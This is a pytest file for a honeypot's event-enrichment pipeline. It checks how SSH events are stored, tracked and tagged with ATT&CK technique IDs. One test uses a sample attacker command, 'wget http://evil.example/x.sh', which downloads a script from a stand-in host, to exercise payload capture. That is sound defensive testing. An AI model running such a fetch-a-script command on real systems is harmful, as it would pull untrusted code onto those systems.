"""Enrichment pipeline tests with in-memory fakes (no database, no network)."""

import asyncio
import datetime as dt

import pipeline as pipeline_module
from pipeline import EnrichmentPipeline
from schemas import SSH_HANDSHAKE_KIND, LoginInfo, RawEvent, Service
from sshd import hash_password

NOW = dt.datetime(2026, 11, 21, 12, 0, tzinfo=dt.timezone.utc)


class FakeEvents:
    def __init__(self):
        self.inserted = []

    async def insert(self, event):
        self.inserted.append(event)


class FakeStorage:
    def __init__(self):
        self.events = FakeEvents()


class FakeGeoIp:
    async def lookup(self, ip):
        return None


class Recorder:
    def __init__(self):
        self.seen = []

    async def process(self, event):
        self.seen.append(event)


class FakeBus:
    def __init__(self):
        self.published = []

    def publish(self, event):
        self.published.append(event)


def build(monkeypatch):
    errors = []
    monkeypatch.setattr(pipeline_module, "record_pipeline_error", lambda stage: errors.append(stage))
    parts = dict(storage=FakeStorage(), credentials=Recorder(), payloads=Recorder(), enriched=FakeBus())
    pipe = EnrichmentPipeline(raw_bus=FakeBus(), enriched_bus=parts["enriched"], storage=parts["storage"],
                              geoip=FakeGeoIp(), credential_tracker=parts["credentials"],
                              payload_tracker=parts["payloads"])
    return pipe, parts, errors


def ssh_event(command=None, payload_url=None, kind="command"):
    return RawEvent(
        service=Service.SSH, source_ip="203.0.113.7", destination_ip="127.0.0.1", timestamp=NOW,
        login_info=LoginInfo(username="root", password_hash=hash_password("x")),
        command=command, payload_url=payload_url, source_port=50000, destination_port=22,
        additional_info={"event_kind": kind},
    )


def test_payload_event_is_stored_published_and_counted(monkeypatch):
    # Regression: record_payload_captured was used without being imported, so every
    # payload event raised NameError after it was stored, and was logged as a pipeline error.
    pipe, parts, errors = build(monkeypatch)
    captured = []
    monkeypatch.setattr(pipeline_module, "record_payload_captured", lambda size: captured.append(size))
    event = ssh_event("wget http://evil.example/x.sh", payload_url="http://evil.example/x.sh")
    asyncio.run(pipe._process_event(event))
    assert errors == []
    assert captured == [None]
    assert parts["payloads"].seen == [event]
    assert parts["storage"].events.inserted[0].technique_id == "T1105"
    assert parts["enriched"].published[0].technique_id == "T1105"


def test_auth_event_is_classified_and_credentials_tracked(monkeypatch):
    pipe, parts, errors = build(monkeypatch)
    asyncio.run(pipe._process_event(ssh_event(kind="auth")))
    assert errors == []
    assert len(parts["credentials"].seen) == 1
    assert parts["storage"].events.inserted[0].technique_id == "T1110.004"


def test_handshake_is_stored_without_technique_or_credentials(monkeypatch):
    pipe, parts, errors = build(monkeypatch)
    handshake = RawEvent(service=Service.SSH, source_ip="198.51.100.9", destination_ip="127.0.0.1",
                         timestamp=NOW, source_port=52000, destination_port=22,
                         additional_info={"event_kind": SSH_HANDSHAKE_KIND, "client_version": "x"})
    asyncio.run(pipe._process_event(handshake))
    assert errors == []
    assert parts["credentials"].seen == []
    assert parts["storage"].events.inserted[0].technique_id is None
